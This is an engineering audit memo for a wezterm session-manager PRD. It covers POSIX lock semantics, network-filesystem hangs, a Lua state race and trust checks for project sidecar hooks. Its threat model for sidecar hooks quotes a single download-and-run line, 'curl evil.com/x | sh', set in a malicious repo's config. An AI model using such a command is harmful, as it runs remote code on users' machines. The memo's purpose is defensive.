# PRD Research Findings — Round 10 (fcntl-semantics / API-revalidation / GLOBAL-concurrency / project-sidecar-trust audit)

Goal of this round: validate four lenses prior rounds left thin or implicit — POSIX advisory lock semantics on the platforms wezsesh actually targets (round 9 added `safefs.AcquireExclusive` as a save-TOCTOU fix but never validated whether `fcntl(F_SETLKW) + watchdog SIGALRM` is even implementable), re-validate every cited Lua-side API after round 9's `tea.After` fabrication finding, the `wezterm.GLOBAL` concurrent-mutation race in the replay guard (open question from round 9), and the project-sidecar trust enforcement path (a new lens — §5.6 introduced project sidecars but the trust model was inherited-by-reference from §6.11 and never explicitly pinned).

**Three new BLOCKERs found** plus seven HIGH-severity findings and four MEDIUMs. The audit-convergence pattern from rounds 5/6/7 (3/3/1) decisively ended at round 8/9 (6/6); round 10 partially converges (3 BLOCKERs, down from 6) but does not stop finding new under-specified surfaces. The headline finding is that **v2.0's `fcntl(F_SETLKW) + watchdog SIGALRM` save-serialization fix is unimplementable on darwin** — `fcntl` syscalls auto-restart on `SA_RESTART` signals (FreeBSD/Darwin behavior), so a watchdog signal does not interrupt the blocked syscall. This survived round 9's "verified against source" claim because the audit cited Linux behavior and never read the Apple/FreeBSD `fcntl(2)` man page.

---

## 1. POSIX advisory lock semantics on darwin / APFS / NFS / cloud-sync — ONE BLOCKER, THREE HIGH

### Findings

The v2.0 spec for `safefs.AcquireExclusive` was: open `O_RDWR|O_NOFOLLOW`, call `fcntl(F_SETLKW)` with a 5-second deadline "via `unix.FcntlFlock` + a watchdog goroutine that signals SIGALRM-equivalent on overrun." This needed verification against actual platform semantics.

#### BLOCKER — `F_SETLKW + watchdog signal` is unimplementable on darwin

`fcntl(F_SETLKW)` blocks the calling thread indefinitely until the lock is acquirable. POSIX specifies it MUST return `EINTR` if interrupted by a signal — but Apple/FreeBSD deviate. Both restart `F_SETLKW` after `SA_RESTART` signals (verified [`man 2 fcntl`](https://man.freebsd.org/cgi/man.cgi?query=fcntl&sektion=2): "in this implementation a call with F_SETLKW is restarted after catching a signal with a SA_RESTART handler"). The PRD's "watchdog signal" idea is therefore non-functional on macOS — the timer fires, the signal is delivered, the kernel restarts the blocked syscall. There is no Go-portable way to break out of the blocked `fcntl`.

The only reliable pattern with a deadline is **polling non-blocking `F_SETLK`** with backoff under a `context.WithTimeout`. v2.1 adopts this.

#### HIGH — POSIX advisory locks have no fairness guarantee

Verified [Pendleton 2010 fairness test](http://bryanpendleton.blogspot.com/2010/07/unix-file-locking-does-not-implement.html): tested across Linux, macOS, FreeBSD; all three exhibited starvation (late-arriving shared locks granted before waiting exclusive locks). Only Solaris 10 implemented fair scheduling. Under a 5s deadline with three or more contended TUIs, one can be starved and silently time out, mapping to `SNAPSHOT_LOCKED` even though the system was making progress. v2.1 mitigation: log `WARN` at 1s and 3s of contended waiting so operators see contention before the deadline hits.

#### HIGH — NFS advisory locks are weakly defined

Linux NFS `fcntl` locks require `lockd` running and have known kernel-level hang bugs (verified [Linux-NFS list, infinite F_SETLKW loops](https://linux-nfs.vger.kernel.narkive.com/f0ZYr5dG/nfs-infinite-loop-in-fcntl-f-setlkw)). With v2.1's polling `F_SETLK` we cannot deadlock, but cross-host serialization between two wezterm processes on different machines sharing a single NFS-mounted snapshot dir may silently fail (lockd not running, or NFSv4 state recovery glitching). v2.1 adds runtime detection via `safefs.IsNetworkFS` (uses `unix.Statfs`), surfaces a one-time WARN at TUI open, and reports through `wezsesh doctor`. Not refused — single-host NFS users still benefit from local advisory-lock serialization.

#### HIGH — Cloud-sync filesystems bypass advisory locks entirely

iCloud Drive, Dropbox, and Google Drive on darwin perform atomic-replace (delete + create new inode) WITHOUT honoring advisory locks (verified [eclecticlight on APFS sync semantics](https://eclecticlight.co/2023/11/15/backup-errors-icloud-drive-and-the-limits-of-apfs/)). A held lock is inode-bound; on sync rewrite, the new inode has no lock and a concurrent writer sees an unlocked file. Mitigation: same WARN as NFS, escalated language about silent data loss, recommend a non-synced path. Not refused (user accepted this risk by choosing the path).

#### HIGH — `O_NOFOLLOW` only protects the FINAL path component

A symlink at any earlier path component is silently followed (verified [LWN on symlink TOCTOU](https://lwn.net/Articles/899543/), [SEI CERT POS35-C](https://wiki.sei.cmu.edu/confluence/display/c/POS35-C.+Avoid+race+conditions+while+checking+for+the+existence+of+a+symbolic+link)). v2.0's `safefs.AcquireExclusive` spec used bare `O_RDWR|O_NOFOLLOW` on a path string — leaving the parent-component symlink hole open. v2.1 mandates the dirfd pattern: `safefs.VerifyDir(parentDir)` first, then `unix.Openat(dirfd, basename, O_NOFOLLOW)`. `AtomicWriteFile` already does this; `AcquireExclusive` is updated to match. Lint rule forbids `os.OpenFile(path, O_NOFOLLOW)` in `internal/safefs/`-using packages.

### Decisions — §6.7, §6.19

- §6.7 v2.1: lock pattern revised. Non-blocking `F_SETLK` polling with 10ms→100ms exponential backoff under `context.WithTimeout(parent, 5s)`. WARN-at-1s/3s logging.
- §6.7 v2.1: `safefs.IsNetworkFS(path)` runtime detection added; one-time WARN at TUI open per detected condition; doctor reports per-path.
- §6.19 v2.1: `O_NOFOLLOW` clarified as final-component-only; mandate VerifyDir → openat dirfd pattern. Signature change: `AcquireExclusive(ctx context.Context, path string)`.
- §6.19 v2.1: `IsNetworkFS` helper added.

### Files cited

- [`man 2 fcntl`](https://man.freebsd.org/cgi/man.cgi?query=fcntl&sektion=2) (FreeBSD/Darwin SA_RESTART behavior).
- [Pendleton 2010 lock-fairness test](http://bryanpendleton.blogspot.com/2010/07/unix-file-locking-does-not-implement.html).
- [Linux-NFS list, infinite F_SETLKW loops](https://linux-nfs.vger.kernel.narkive.com/f0ZYr5dG/nfs-infinite-loop-in-fcntl-f-setlkw).
- [eclecticlight on APFS+iCloud](https://eclecticlight.co/2023/11/15/backup-errors-icloud-drive-and-the-limits-of-apfs/).
- [LWN on symbolic-link TOCTOU](https://lwn.net/Articles/899543/).
- `golang.org/x/sys/unix.FcntlFlock` (signature confirmed via [pkg.go.dev](https://pkg.go.dev/golang.org/x/sys/unix#FcntlFlock); available on all four target platforms).

---

## 2. Re-validate every cited Lua-side API — TWO MEDIUM

### Findings

After round 9's `tea.After` fabrication finding (cited as load-bearing across four PRD revisions, never existed in any released bubbletea), I re-ran a sweep against current source for every cited wezterm and resurrect API.

**Confirmed (all behave as cited)**:
- `wezterm.shell_join_args` and `wezterm.shell_quote_arg` (`config/src/lua.rs:418,422`).
- `pane:writer()` and `pane:send_text` (`lua-api-crates/mux/src/pane.rs:~120`).
- `wezterm.background_child_process` (`lua-api-crates/spawn-funcs/src/lib.rs:38` — async, raises Lua error on spawn failure).
- `wezterm.run_child_process` (`lua-api-crates/spawn-funcs/src/lib.rs:24` — async, no timeout, suspends config-eval).
- `wezterm.json_parse` raises Lua error on malformed input (`lua-api-crates/serde-funcs/src/lib.rs`).
- `wezterm.GLOBAL` is `Arc<Mutex<BTreeMap<String, Value>>>` rejecting integer keys (`lua-api-crates/share-data/src/lib.rs`).
- `wezterm.mux.spawn_window` exists and returns `(MuxTab, MuxPane, MuxWindow)`.
- `wezterm cli list-clients --format json` has `focused_pane_id` field; clients sorted by `last_input` recency (`wezterm-client/src/client.rs:~1321`).
- `wezterm cli rename-workspace`: stderr "unable to resolve current workspace"; no collision check (`wezterm/src/cli/rename_workspace.rs`).
- `vtparse/src/transitions.rs:250`: NULs silently ignored in OSC sequences.
- `wezterm-escape-parser/src/osc.rs:~1267-1278`: SetUserVar handler base64-decodes; invalid base64 propagates error → drops OSC.
- `LuaPipe`/`update_to_latest` at `config/src/lib.rs:175-220`.

**MEDIUM finding A — `mux.spawn_window` is async-exposed-as-coroutine, not strictly synchronous**

Source: `lua-api-crates/mux/src/window.rs` exposes `spawn_window` via `lua.create_async_function`. The PRD wording "returns the pane ID synchronously after spawn" is technically loose — the function is async-exposed, but mlua's coroutine bridge means Lua calling code reads as synchronous (`local _, pane, _ = wezterm.mux.spawn_window {...}; pane:pane_id()` works as written; the coroutine yields and resumes when the future completes). The PRD's example code is correct in practice. No edit required, but a v2.1 hygiene note clarifies the wording for future audits: "async-exposed-as-coroutine; from Lua call sites it appears synchronous."

**MEDIUM finding B — wezterm source line citations drift**

Round 9 cited `emit_user_var_event` at `wezterm-gui/src/termwindow/mod.rs:2564-2608`. Round 10 found it at ~line 2080. Function name and behavior unchanged; line numbers drifted across wezterm versions. Future audit guidance: validate by symbol name + signature, not line number. Line citations to wezterm source should be treated as approximate-and-drifty.

**Resurrect API citations**: GitHub access to MLFlexer/resurrect.wezterm Lua sources was unavailable to the audit subagent; resurrect citations could not be re-validated this round. Defer to runtime-integration testing (resurrect's API will be exercised in v0.1 dev).

### Decisions — §6.15, audit guidance

- §6.15 v2.1: line citation for `emit_user_var_event` updated with note about drift; future audits validate by symbol + signature.
- No structural PRD changes from this spike. Round 9's `tea.After` was a fabrication; round 10's sweep found no other fabrications in the cited Lua-side API surface.

### Files cited

- `wezterm` source per item above (commit at audit time; line numbers will drift).

---

## 3. `wezterm.GLOBAL` concurrent mutation race in replay guard — ONE HIGH

### Findings

Round 9 left an open question: multiple `user-var-changed` events can fire concurrently. Does the replay-guard write-back `state.set_state(pid_key, session)` race against itself, allowing `seen_ids` lost-update and weakening replay protection?

I read `lua-api-crates/share-data/src/lib.rs` carefully and traced the read-modify-write semantics:

1. `wezterm.GLOBAL` is `Arc<Mutex<BTreeMap<String, Value>>>` with **per-key** mutex granularity. Reading `wezterm.GLOBAL.foo[bar]` acquires `Object.inner.lock()`, looks up the key, **clones** the `Value`, releases the lock, and converts to a Lua table via `gvalue_to_lua` — which calls `lua.create_table()` and recursively populates a NEW table. Sub-tables in the returned Lua table are NOT shared references back into the Rust BTreeMap.
2. Writing `wezterm.GLOBAL.foo[bar] = value` acquires the lock, deserializes the Lua table to a `Value`, inserts under the key, releases.
3. **Therefore**: `local s = wezterm.GLOBAL.wezsesh_state[pid]; s.seen_ids[id] = ...; wezterm.GLOBAL.wezsesh_state[pid] = s` is a read-modify-write across two `__index`/`__newindex` operations, NOT atomic. If two handlers concurrently read the same snapshot and both write back, the second writer's `seen_ids` overwrites the first's.

#### HIGH — but conditionally closed by Lua's cooperative scheduling

The race is reachable in principle. **It is closed in practice because wezterm's Lua VM runs handlers cooperatively**: `emit_user_var_event` schedules each handler as an async task via `promise::spawn::spawn`, but they share a single-threaded Lua context that only yields at `.await` points. Within one handler invocation, all synchronous Lua code runs to completion before any other handler can interleave.

So as long as handler steps (a) through (h) in §6.14 contain zero `.await` points (no `wezterm.run_child_process`, no `wezterm.sleep_ms`, no other `add_async_function`-exposed wezterm API), the race never opens. The replay guard is correct.

But this is a load-bearing assumption that was previously unstated. A future maintainer adding `wezterm.run_child_process` somewhere in (a)–(h) for any reason would silently weaken replay protection. v2.1 pins the assumption explicitly + adds a CI lint that walks the handler AST and fails on any known-async wezterm function call between markers `-- (a)` and `-- (h)`.

**Severity downgrade rationale**: round 9's spike-C agent classified this as a BLOCKER. After tracing the cooperative-scheduling guarantee, I downgrade to HIGH. The race is theoretically reachable but practically closed; the v2.1 fix is a documentation pin + lint, not a structural redesign. The fallback (HMAC + 30s freshness) is the actual primary replay defense; `seen_ids` is defense-in-depth + #3524-broadcast-bug deduplication.

### Decisions — §6.14

- §6.14 v2.1: explicit "concurrency assumption" subsection added documenting the cooperative-scheduling guarantee + the (a)–(h) `.await`-free requirement.
- §8.1 v2.1: CI lint (`internal/lualint/`) parses handler AST and fails on async-call sites between (a) and (h).
- Documented fallback: 30s freshness + HMAC are the primary replay defense; `seen_ids` is defense-in-depth.

### Files cited

- `lua-api-crates/share-data/src/lib.rs` (Object lock granularity; `__index` / `__newindex` semantics; `gvalue_to_lua` deserialization).
- `wezterm-gui/src/termwindow/mod.rs` (`emit_user_var_event` scheduling via `promise::spawn::spawn`).
- `lua-api-crates/spawn-funcs/src/lib.rs:30-50` (run_child_process is async; line numbers approximate).

---

## 4. Project sidecar trust enforcement + network-FS hang surfaces — ONE BLOCKER, THREE HIGH, TWO MEDIUM

### Spike 4a: project sidecar trust enforcement was ambiguous (HIGH)

§5.6 introduced project sidecars at `<picked_path>/.wezsesh.json` carrying `on_create` hooks. §5.6 referenced §6.11 for the trust check but did NOT explicitly state the check is mandatory and identical to the snapshot-sidecar restore path. Ambiguity: a future implementer could read §6.11's "hash-based trust for `on_*` hooks" as snapshot-only and skip the check for project sidecars, opening RCE-on-pick from a malicious git-cloned repo (clone untrusted repo → it has `.wezsesh.json` with `on_create = "curl evil.com/x | sh"` → user picks dir through `n` flow → arbitrary code runs).

**Decision** — §5.6 v2.1 explicit "Project sidecar trust enforcement" subsection: trust hash bound to the project sidecar's absolute path; fail-closed default; same code path as snapshot-sidecar restore; documented threat model; toast-on-silent-skip UX.

### Spike 4b: project sidecar trust approval keying (HIGH)

`wezsesh trust <name>` takes a workspace name. For project sidecars, the workspace is created by the `n` flow before `on_create` runs — so the workspace name exists, but only after creation. Approval flow:
- After `n`-flow creates the workspace, the user sees a toast `wezsesh: on_create not trusted for "~/code/foo". Run 'wezsesh trust ~/code/foo' to approve.`
- `wezsesh trust ~/code/foo` resolves the project sidecar path via `wezterm cli list --format json` (workspace's first pane's cwd) → `<cwd>/.wezsesh.json`.
- Fallbacks: `wezsesh trust --path <picked_path>` (if workspace doesn't exist yet) or `wezsesh trust --sidecar <absolute_path>` (if sidecar lives in a non-root subdir).

This was undefined in v2.0; v2.1 adds the resolution rules.

### Spike 4c: silent-failure UX for project sidecars (MEDIUM)

Default `prompt_on_untrusted = false` matches direnv's `direnv allow` UX (opt-in, never auto-prompt). For the `n` flow with new directories, this means silent skip of `on_create` — the user picks a dir expecting their dev server to start, sees no error, only later realizes the hook didn't run. v2.1: every silent skip emits a 6-second toast with the exact `wezsesh trust` command. README + doctor recommend `prompt_on_untrusted = true` for users who frequently use `n` with new dirs. Default stays `false` to match direnv.

### Spike 4d: project sidecar authorship guidance (MEDIUM)

The PRD offered no guidance for project authors committing `.wezsesh.json` to git. v2.1 adds a §6.11 paragraph: `on_create` runs as the user; treat it as `npm postinstall`-grade published code; stick to commands safe to run in CI; document in project README. Surfaced by `wezsesh trust --show <name>` before approval.

### Spike 4e: `io.open` hang on network-mounted home (BLOCKER)

§7.1 v1.8 claimed the pre-flight `io.open(binary_abs_path, "r")` check is "fork-free, can't hang." This is wrong. `io.open` calls libc `fopen(3)` → kernel `open(2)`. On a network-mounted home directory (autofs / NFS / SMB / SSHFS / Apple File Provider iCloud Drive cloud-only files), `open(2)` blocks in the kernel for 30–60 seconds awaiting an unresponsive server. Lua has no portable timeout for filesystem ops. The pre-flight check eliminates fork overhead but does NOT eliminate path-resolution hangs.

The v1.8 mitigation collapsed three hang triggers (fork-overhead, codesign/dyld, Go runtime init) to two; the third (path resolution) was left implicit. v2.1 documents this honestly; recommends installing wezsesh to a local-disk path for users on network-mounted home dirs; adds `wezsesh doctor` checks for binary path / plugin path / state dir / trust dir / snapshot dir all reporting their FS type.

**Severity rationale**: BLOCKER because the v1.8 PRD made a wrong claim about hang-resistance. v2.1 doesn't fix the underlying hang (no portable Lua mitigation exists); it corrects the claim and provides operational visibility. Without v2.1, an implementer could rely on the v1.8 claim and ship a plugin that silently hangs wezterm on a network-mounted home — broken UX with no clear root cause.

### Spike 4f: XDG path reads with no Go-side timeout (HIGH)

§6.20's 2s `context.WithTimeout` covers `internal/wezcli/`. §6.6's 5s timeout covers `internal/snapshots/`. **But state.json reads (`internal/state/`) and trust file lookups (`internal/trust/`) had no timeout.** These default to `~/.local/state/` and `~/.local/share/` — under `$HOME`. Same hazard as 4e: network-mounted home → `open(2)` blocks indefinitely. Without a context timeout, every TUI launch (which reads state.json) and every restore (which reads trust files) hangs the binary.

**Decision** — §6.19 v2.1: every read in `internal/state/` and `internal/trust/` MUST be wrapped in `context.WithTimeout(2 * time.Second)`. New error code `XDG_PATH_TIMEOUT` (additive to §6.3). Caveat: Go context cancels the goroutine but cannot kill an in-flight kernel `open(2)` — the syscall completes after the kernel timeout regardless. Mitigation bounds *our* wait, not the kernel's. Documented in §7.4.

### Spike 4g: platform hang risks documented in §7.4 (MEDIUM)

A new §7.4 subsection consolidates residual hang surfaces no Go context can cancel:
- `io.open(binary_path)` Lua pre-flight on network mount.
- First `open(2)` of a cloud-only iCloud Drive file on darwin (Optimize Storage daemon-mediated download).
- `wezterm.run_child_process({wezsesh_bin, "keygen"})` at plugin load with binary on network mount.
- `wezterm.plugin.update_all()` reload triggering cascading hangs across windows.

The mitigation strategy is bounded: bound everything we *can* (Go-side context timeouts), document everything we *can't*. README install guide recommends local-disk paths for network-mounted-home users.

### Files cited

- `lua-api-crates/spawn-funcs/src/lib.rs:30-50` (`run_child_process` no-timeout claim).
- Apple File Provider docs (iCloud Drive Optimize Storage on-demand materialization).
- POSIX `open(2)` blocking semantics (no portable timeout; depends on kernel-level mount-timeout settings).

---

## Summary of changes for PRD_V4 (= internally stamped v2.1)

### BLOCKER fixes (must change before code lands)

- **§6.7 / §6.19** (correctness): v2.0's `fcntl(F_SETLKW) + watchdog SIGALRM` is unimplementable on darwin. Replaced with non-blocking `F_SETLK` polling under `context.WithTimeout(parent, 5s)`. WARN-at-1s/3s logging. Spike 1.
- **§6.19** (reliability): every read in `internal/state/` and `internal/trust/` MUST be wrapped in `context.WithTimeout(2s)`. Without it, network-mounted home dirs hang the binary. New error code `XDG_PATH_TIMEOUT`. Spike 4f.
- **§7.1** (correctness of claim): v1.8's "fork-free = no-hang" claim was wrong. `io.open` itself blocks on network mount. v2.1 corrects the claim; documents residual risk; recommends local-disk install path. Spike 4e.

### HIGH-severity correctness/security/reliability

- **§6.7 / §7.3**: NFS / cloud-sync detection via `safefs.IsNetworkFS`. One-time WARN per detected condition; doctor reports per-path. Spike 1.
- **§6.19**: `O_NOFOLLOW` only protects final path component. `safefs.AcquireExclusive` updated to use VerifyDir → openat dirfd pattern. Lint rule. Spike 1.
- **§6.19**: POSIX advisory lock fairness — WARN-at-1s/3s logging exposes contended waits. Spike 1.
- **§5.6**: project sidecar trust enforcement was ambiguous. Explicit subsection added pinning the trust check + threat model. Spike 4a.
- **§5.6**: project sidecar approval keying via `wezsesh trust <name>` resolution rules. Spike 4b.
- **§6.14**: `wezterm.GLOBAL` replay-guard race conditional on cooperative scheduling. Documented assumption + CI lint enforcing `.await`-free (a)–(h) handler steps. Spike 3.
- **§7.4 (new)**: residual platform hang risks documented. Spike 4g.

### MEDIUM updates

- **§5.6**: silent-failure UX hardened with toast-on-skip. Spike 4c.
- **§5.6 / §6.11**: project sidecar authorship guidance. Spike 4d.
- **§6.15**: wezterm source line citations drift; validate by symbol, not line. Spike 2.
- **§7.1**: `mux.spawn_window` async-exposed-as-coroutine wording clarified. Spike 2.

### Severity tally

- BLOCKER: 3 (fcntl pattern unimplementable on darwin, XDG read timeout missing, io.open hang claim wrong).
- HIGH: 7 (NFS/cloud-sync lock semantics, O_NOFOLLOW final-component-only, lock fairness logging, project sidecar trust enforcement, project sidecar approval keying, GLOBAL race conditional on scheduling, platform hang risks documented).
- MEDIUM: 4 (silent-failure UX, authorship guidance, line citation drift, spawn_window wording).
- No-issue: numerous Lua-side API citations re-confirmed.

### Status

v10 complete. Three BLOCKERs addressed; PRD bumped to v2.1. The audit-convergence pattern partially holds — round 10's BLOCKER count (3) is half of round 8/9's (6 each), and most of the round-10 BLOCKERs are corrections to v2.0's recently-added save-serialization fix (i.e., we're auditing our own audit). This is encouraging but NOT decisive convergence. **Recommend one more round before terminating** — round 11 should focus on what v2.1's edits introduced (the `safefs.IsNetworkFS` detection logic, the `F_SETLK` polling backoff, the XDG read timeouts, the project-sidecar trust path resolution) plus any remaining open suggestions from round 9:

- **Encryption + flock interaction** (round 9 suggested, not yet covered): encrypted snapshots are opaque ciphertext; do POSIX advisory locks behave correctly when the file is concurrently being decrypted/re-encrypted by resurrect's age/rage/gpg path?
- **Resurrect API runtime validation** (this round skipped because resurrect repo access failed): runtime-test the cited resurrect events `restore_workspace.finished`, `file_io.write_state.{start,finished}`, `resurrect.error` against an actual installed resurrect.
- **`SwitchToWorkspace` activity coupling** (round 9 suggested): is `mux.set_active_workspace` called unconditionally before the spawn-when-empty check in current wezterm? Implicit "workspace switch" semantics of `cli activate-pane`?
- **Bubbletea v2 `cursed_renderer` resize semantics** (open lens): `ultraviolet.TerminalRenderer` behavior on terminal resize during OSC writes?
- **Reply socket SUN_PATH ceiling on darwin with long usernames** (open lens): `/tmp/wezsesh-<uid>/<8hex>.sock` is fine for numeric uid; what if the runtime_dir override is longer? Validate the 104-byte ceiling at config-load time.
- **Resurrect `default_on_pane_restore` extension point validation**: confirm wezsesh's `on_pane_restore` callback can actually intercept resurrect's send_text path (this is foundational for §6.18's argv allowlist).

If round 11 finds zero BLOCKERs and zero HIGH-severity correctness issues, the audit phase is done.

---

The most striking finding of this round is that the v2.0 lock-pattern fix from round 9 was itself broken — the "watchdog SIGALRM" pattern doesn't work on darwin because of `SA_RESTART` semantics. This pattern (one round's fix being wrong because the next round's audit reads more carefully) suggests the right termination condition is not "zero findings in one round" but "zero findings AGAINST our own recent edits in one round." Round 11's primary lens should be exactly that: re-validate v2.1's `safefs.IsNetworkFS`, `F_SETLK` polling, and XDG timeout edits against the platforms they target.
